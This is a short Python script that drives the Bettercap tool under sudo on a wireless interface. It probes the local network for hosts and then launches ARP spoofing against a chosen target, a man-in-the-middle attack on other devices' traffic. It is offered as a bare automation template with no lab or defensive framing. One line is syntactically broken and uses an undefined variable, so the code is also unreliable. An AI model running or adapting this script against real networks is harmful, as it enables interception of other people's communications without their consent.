import subprocess
import time

def automation_script():
    # Start Bettercap in the background
    # -no-colors makes it easier to read output if you process it later
    print("[*] Launching Bettercap...")
    process = subprocess.Popen(
        ['sudo', 'bettercap', '-iface', 'wlan0', '-no-colors'],
        stdin=subprocess.PIPE,  # We will write to this
        stdout=subprocess.PIPE, # We will read from this
        stderr=subprocess.PIPE,
        text=True,              # Treat input/output as text, not bytes
        bufsize=1               # Buffer line-by-line
    )

    # Helper function to send commands
    def send(cmd):
        print(f" -> Sending: {cmd}")
        process.stdin.write(cmd + "\n")
        process.stdin.flush() # CRITICAL: Forces the command to be sent immediately

    # --- YOUR AUTOMATION SEQUENCE ---
    try:
        time.sleep(3) # Wait for startup
        
        send("net.probe on")
        time.sleep(5) # Let it scan for 5 seconds
        
        send("net.arp.spoof.targets " IP)
        send('arp.spoof on')
        time.sleep(2)
        
        
        send("exit") # Clean exit
        
        # Read the final output (optional)
        stdout, stderr = process.communicate()
        print("\n--- CAPTURED OUTPUT ---\n")
        print(stdout)

    except KeyboardInterrupt:
        process.terminate()

if __name__ == "__main__":
    automation_script()